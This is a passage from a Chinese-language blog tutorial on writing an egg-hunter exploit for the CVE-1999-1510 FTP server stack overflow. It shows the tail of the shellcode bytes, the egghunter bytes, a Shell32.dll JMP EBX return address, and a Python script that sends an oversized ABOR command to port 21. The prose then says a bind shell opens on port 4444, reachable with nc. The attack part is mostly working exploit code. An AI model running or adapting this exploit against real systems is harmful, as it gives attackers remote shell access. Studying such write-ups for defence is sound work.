class="string">"\x0a\x63\x5e\x75\x48\x9a\xdd\x7f\x31\x59\xfd\x0a\x34\x25\xb9"</span></span><br><span class="line"><span class="string">"\xe7\x44\x36\x2c\x07\xfa\x37\x65"</span>) <span class="comment">#Payload prefixed with “ringring” tag</span></span><br><span class="line"></span><br><span class="line">egghunter = (<span class="string">"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"</span></span><br><span class="line"><span class="string">"\xef\xb8\x72\x69\x6e\x67\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"</span>)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">"\x90"</span>*(<span class="number">1155</span>-(len(shellcode)+len(egghunter)))</span><br><span class="line">ebx = <span class="string">"\x8F\xE8\xB1\x7C"</span>    <span class="comment">#JMP EBX 7CB1E88F From Shell32.dll      </span></span><br><span class="line">nops = <span class="string">"\x90"</span>*<span class="number">281</span>           <span class="comment">#281 nops   </span></span><br><span class="line">       </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>,<span class="number">21</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Start Sending Payload.."</span></span><br><span class="line">s.recv(<span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER anonymouse\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">2000</span>)</span><br><span class="line">s.send(<span class="string">'PASS anonymouse\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">2000</span>)</span><br><span class="line">s.send(<span class="string">'ABOR '</span> + shellcode + buffer + egghunter + ebx + nops + <span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Payload Send Successful.."</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;执行Exploit脚本<br><img src="/2017/02/25/CVE-1999-1510-egghunter/14.png"><br>&emsp;成功开启4444端口<br>&emsp;此时可选择在宿主机上’nc + host 4444’ 连接受害者主机的Shell<br><img src="/2017/02/25/CVE-1999-1510-egghunter/15.png">  </p>
<p><strong>0x06.参考转注==</strong><br>&emsp;HackSys Team:(<a href="http://hacksys.vfreaks.com/research/egg-hunter-twist-in-buffer-overflow-bisonware-ftp-server-v3-5.html" target="_blank" rel="noopener">http://hacksys.vfreaks.com/research/egg-hunter-twist-in-buffer-overflow-bisonware-ftp-server-v3-5.html</a>)<br>&emsp;看雪老前辈：(<a href="http://www.pediy.com/kssd/pediy11/120392.html" target="_blank" rel="noopener">http://www.pediy.com/kssd/pediy11/120392.html</a>)</p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&text=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&is_video=false&description=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP&body=Check out this article: http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&title=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/02/25/CVE-1999-1510-egghunter/&name=CVE-1999-1510栈溢出漏洞之“Egg Hunter”方式编写EXP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Kasymobv Lee
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Disqus Comments -->


